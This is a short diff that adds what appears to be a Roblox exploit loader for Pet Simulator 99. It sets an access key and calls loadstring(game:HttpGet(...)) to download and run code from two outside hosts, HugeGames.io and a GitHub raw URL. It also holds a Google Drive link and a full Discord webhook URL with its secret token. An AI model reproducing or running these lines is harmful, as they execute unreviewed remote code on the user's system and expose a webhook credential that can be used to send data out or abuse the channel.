@@ -1,6 +1,14 @@
 https://raw.githubusercontent.com/TranMyNhi/TranMyNhi/main/PS99P
 
+https://drive.google.com/file/d/1cULvWENKhgQ36FS-XmPzv5krDZdBC8-O/view
 
+getgenv().AuthKey = "HUGE_Zli1KxbTr318"
+getgenv().LoadSettings = {
+    Example_Setting = Example_Value
+}
+loadstring(game:HttpGet("https://HugeGames.io/ps99"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lenutjr/lenut/main/scripts"))()
 
 
 https://discord.com/api/webhooks/1206578588581896242/wvsQ-5NNmS1YslaxP2-xMuF_gk6_brLD0WEIHcIZL86rFRHU-KIg5m8LOmati2QX6w7Z
